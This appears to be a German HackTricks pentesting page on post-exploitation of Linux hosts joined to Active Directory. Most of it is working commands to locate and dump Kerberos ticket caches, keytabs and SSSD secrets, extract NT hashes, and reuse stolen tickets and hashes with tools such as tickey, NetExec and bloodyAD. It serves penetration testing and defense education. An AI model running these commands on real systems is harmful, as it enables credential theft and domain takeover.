# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Eine Linux-Maschine kann ebenfalls in einer Active-Directory-Umgebung vorhanden sein.

Eine Linux-Maschine innerhalb einer AD-Umgebung kann **Kerberos-Material lokal speichern**: Benutzer-Caches, Maschinen-/Service-Keytabs und von SSSD verwaltete Secrets. Diese Artefakte können normalerweise wie alle anderen Kerberos-Credentials wiederverwendet werden. Um die meisten davon zu lesen, musst du der Benutzer sein, dem das Ticket gehört, oder **root** auf der Maschine sein.

## Enumeration

### AD enumeration from linux

Wenn du Zugriff auf ein AD unter Linux (oder auf eine Bash-Shell in Windows) hast, kannst du [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) verwenden, um das AD zu enumerieren.

Du kannst auch die folgende Seite aufrufen, um **weitere Möglichkeiten zur Enumeration von AD unter Linux** kennenzulernen:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP-Verzeichnis** mit einem MIT-**Kerberos**-Key Distribution Center für eine Verwaltung ähnlich wie bei Active Directory. Durch die Verwendung des Dogtag-**Certificate-Systems** für die Verwaltung von CA- und RA-Zertifikaten unterstützt es **Multi-Faktor**-Authentifizierung, einschließlich Smartcards. SSSD ist für Unix-Authentifizierungsprozesse integriert. Mehr darüber erfährst du hier:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakte von domain-joined Hosts

Bevor du dich mit Tickets beschäftigst, solltest du feststellen, **wie der Host zu AD hinzugefügt wurde** und **wo das Kerberos-Material tatsächlich gespeichert ist**. Auf modernen Linux-Hosts wird dies üblicherweise mit `realmd` + `adcli` + `sssd` gehandhabt und nicht nur über einfache Dateien in `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Dies zeigt schnell, ob der Host AD vertraut, ob SSSD Identitäten oder Tickets cached und ob **Machine-/Service-Keytabs** oder **KCM-Secrets** zur Ausnutzung verfügbar sind.

## Arbeiten mit Tickets

### Pass The Ticket

Auf dieser Seite findest du verschiedene Orte, an denen du **Kerberos-Tickets innerhalb eines Linux-Hosts finden** kannst. Auf der folgenden Seite erfährst du, wie du diese CCache-Ticketformate in Kirbi (das Format, das du unter Windows verwenden musst) umwandelst und wie du einen PTT-Angriff durchführst:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Wenn du die **Linux-spezifischen Workflows zur Ticket-Ernte** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` usw.) suchst, findest du sie auf der entsprechenden Seite:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Wiederverwendung von CCACHE-Tickets aus /tmp

CCACHE-Dateien sind Binärformate zum **Speichern von Kerberos-Anmeldedaten**. `FILE:/tmp/krb5cc_%{uid}` ist weiterhin verbreitet, aber moderne Linux-Deployments verwenden auch `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` oder `KCM:%{uid}`. Überprüfe die Umgebungsvariable **`KRB5CCNAME`** und die Einstellung `default_ccache_name`, bevor du annimmst, dass sich Tickets in `/tmp` befinden.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE-Ticket-Wiederverwendung aus dem Keyring

**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz des Computers deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool für diesen Zweck ist unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) zu finden. Es ermöglicht die Extraktion, indem es sich in Sitzungen injiziert und Tickets nach `/tmp` dumpt.

Zur Konfiguration und Verwendung dieses Tools werden die folgenden Schritte ausgeführt:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Dieses Verfahren versucht, sich in verschiedene Sessions einzuschleusen. Ein Erfolg wird dadurch angezeigt, dass extrahierte Tickets in `/tmp` nach dem Namensschema `__krb_UID.ccache` gespeichert werden.

### CCACHE-Ticket-Wiederverwendung aus SSSD KCM

SSSD verwaltet eine Kopie der Datenbank unter dem Pfad `/var/lib/sss/secrets/secrets.ldb`. Der zugehörige Schlüssel wird als versteckte Datei unter dem Pfad `/var/lib/sss/secrets/.secrets.mkey` gespeichert. Standardmäßig ist der Schlüssel nur lesbar, wenn Sie über **root**-Berechtigungen verfügen.

Durch Aufrufen von **`SSSDKCMExtractor`** mit den Parametern --database und --key werden die Datenbank analysiert und die **Secrets entschlüsselt**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Der **Kerberos credential cache blob kann in eine verwendbare Kerberos CCache-Datei konvertiert werden**, die an Mimikatz/Rubeus übergeben werden kann.

### Schnelle keytab-Triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Konten aus /etc/krb5.keytab extrahieren

Schlüssel von Dienstkonten, die für Dienste mit root-Rechten unerlässlich sind, werden sicher in **`/etc/krb5.keytab`**-Dateien gespeichert. Diese Schlüssel, die für Dienste Passwörtern ähneln, erfordern strikte Vertraulichkeit.

Um den Inhalt der keytab-Datei zu überprüfen, kann **`klist`** verwendet werden. Unter Linux gibt `klist -k -K -e` die Principals, Schlüsselversionsnummern, Verschlüsselungstypen und das Rohschlüsselmaterial aus. Wenn der Schlüsseltyp **23 / RC4-HMAC** ist, entspricht der Schlüsselwert auch dem **NT-Hash** dieses Principals.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Für Linux-Benutzer bietet **`KeyTabExtract`** Funktionen zum Extrahieren des RC4-HMAC-Hashs, der für die Wiederverwendung von NTLM-Hashes genutzt werden kann. Dies funktioniert jedoch nur, wenn die Keytab weiterhin Material für **etype 23 / RC4-HMAC** enthält. In **AES-only**-Umgebungen erhalten Sie möglicherweise keinen wiederverwendbaren NT-Hash, können sich aber weiterhin direkt über Kerberos mit der Keytab authentifizieren.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Unter macOS dient **`bifrost`** als Tool zur Analyse von Keytab-Dateien.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Unter Verwendung der extrahierten Konto- und Hash-Informationen können mithilfe von Tools wie **`NetExec`** Verbindungen zu Servern hergestellt werden.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Das Computerkonto aus `/etc/krb5.keytab` wiederverwenden

Auf Systemen, die mit `realmd`/`adcli`/`sssd` eingebunden wurden, enthält `/etc/krb5.keytab` normalerweise das **Computerkonto** sowie einen oder mehrere **Host-/Service-Principals**. Wenn du **root** hast, solltest du die Datei nicht einfach ausgeben: Verwende stattdessen einen der mit `klist -k` aufgelisteten Principals, um ein TGT anzufordern und als der Linux-Host selbst zu agieren.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Dies ist besonders nützlich, wenn das **Computerobjekt** selbst delegierte Berechtigungen in AD besitzt oder der Host andere Secrets wie ein **gMSA** abrufen darf.

### Gestohlenes Kerberos-Material mit Linux-first-AD-Tools wiederverwenden

Sobald du über einen gültigen `ccache` oder ein nutzbares Keytab verfügst, kannst du direkt von **Linux** aus gegen AD vorgehen, ohne vorher alles in Windows-Formate konvertieren zu müssen. Viele moderne Tools akzeptieren `KRB5CCNAME` / Kerberos-Authentifizierung nativ:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Dies ist eine gute Brücke zwischen **Linux post-exploitation** und **AD object abuse**. Für die eigentlichen Object-Level-Abuse-Pfade siehe:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux-gMSA-/Managed-Service-Account-Artefakte

Aktuelle Linux-Deployments können **Managed Service Accounts** direkt aus AD verwenden. In der Praxis bedeutet dies, dass man nach der Kompromittierung eines Linux-Servers nicht nur das Host-Keytab, sondern auch **service-spezifische Keytabs** finden kann, die aus einer gMSA generiert wurden. Häufige Fundorte sind `/etc/gmsad.conf`, deploymentspezifische Konfigurationsdateien und zusätzliche `*.keytab`-Dateien unter `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Dies verschafft dir eine wiederverwendbare Kerberos-Identität für die an diese SPNs gebundenen gMSAs, **ohne einen Windows-Endpunkt zu berühren**. Informationen zum **domänenseitigen** Missbrauch von gMSA/dMSA nach dem Erlangen höherer Berechtigungen in AD findest du unter:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Referenzen

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
